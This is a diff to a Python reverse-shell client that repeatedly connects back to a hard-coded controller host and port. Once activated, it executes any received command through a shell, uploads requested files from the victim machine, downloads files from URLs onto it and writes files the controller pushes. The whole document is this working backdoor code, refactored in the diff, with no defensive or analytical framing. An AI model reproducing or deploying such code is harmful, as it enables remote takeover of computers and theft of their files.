@@ -1,59 +1,63 @@
-#!/usr/bin/env python3
-
 import os
 import sys
 import time
 import socket
 import subprocess as sp
-from socket import AF_INET, SOCK_STREAM
 from urllib.request import urlopen
 from common import pr, Send, Receive
 
 HOST = '127.0.0.1'
-PORT = 2000
+PORT = 1000
 
-active = False
 sock = None
-ret = ''
+active = False
 
 # ⬆️ ul file
-def Upload(sock, file):
+def upload(sock, fn):
   try:
-    f = open(file, 'rb')
+    f = open(fn, 'rb')
     d = f.read()
     f.close()
-    Send(sock, d + b'FILENAMEXXX%sFILEXXX' % file.encode())
+    Send(sock, d, 1)
     time.sleep(1)
     return 'File sent 🍺'
   except IOError:
     return 'Error opening file ⚠️'
 
-# TODO: ssl
-def Downhttp(sock, url):
+def dlhttp(sock, url):
   fn = url.split('/')[-1]
   fn = fn.split('?')[0]
   fn = fn.split('#')[0]
 
-  f = open(fn, 'wb')
-  f.write(urlopen(url).read())
-  f.close()
-
-  return "Download finished 🍺"
+  try:
+    f = open(fn, 'wb')
+    f.write(urlopen(url).read())
+    f.close()
+    return 'Download finished 🍺'
+  except OSError as e: # TODO
+    return e + ' ⚠️'
 
 def run(s):
-  c = sp.Popen(s, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
-  out, err = c.communicate()
+  p = sp.Popen(s, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
+  out, err = p.communicate()
   out = out.decode('utf-8')
   err = err.decode('utf-8')
   return out + '\n' + err
 
+def cwd(prev=None):
+  if prev:
+    return prev + '\n' + os.getcwd() + '>'
+  else:
+    return os.getcwd() + '>'
+
 while True:
   try:
-    sock = socket.socket(AF_INET, SOCK_STREAM)
+    sock = socket.socket()
     sock.connect((HOST, PORT))
-    if Receive(sock).decode() == 'activate':
+
+    if Receive(sock) == 'activate':
       active = True
-      Send(sock, os.getcwd() + '>')
+      Send(sock, cwd())
 
     while active:
       data = Receive(sock)
@@ -65,38 +69,27 @@ while True:
         break
 
       # ⬇️ dl file
-      if data.endswith(b'FILEXXX'):
-        data = data[:-7].split(b'FILENAMEXXX')
-        d = b''.join(data[:-1])
-        fn = data[-1].decode() # to str
+      if type(data) == str:
+        if data.startswith('dl '):
+          ret = upload(sock, data[3:])
+
+        elif data.startswith('dlhttp '):
+          ret = dlhttp(sock, data[7:])
+
+        else:
+          ret = run(data)
+
+        Send(sock, cwd(ret))
+
+      else:
         try:
-          f = open(fn, 'wb')
-          f.write(d)
+          f = open(data[0], 'wb')
+          f.write(data[1])
           f.close()
         except IOError:
           ret = 'Error opening file ⚠️'     
         ret = 'File received 🍺'
-        Send(sock, '%s\n%s>' % (ret, os.getcwd()))
-        continue
-      else:
-        data = data.decode()
-
-      if data == 'deactivate':
-        active = False
-        sock.close()
-        break
-
-      elif data.startswith('dl '):
-        ret = Upload(sock, data[3:])
-
-      elif data.startswith('dlhttp '):
-        ret = Downhttp(sock, data[9:])
-
-      else:
-        ret = run(data)
-
-      ret += '\n%s>' % os.getcwd()
-      Send(sock, ret)
+        Send(sock, cwd(ret))
 
   except socket.error:
     sock.close()
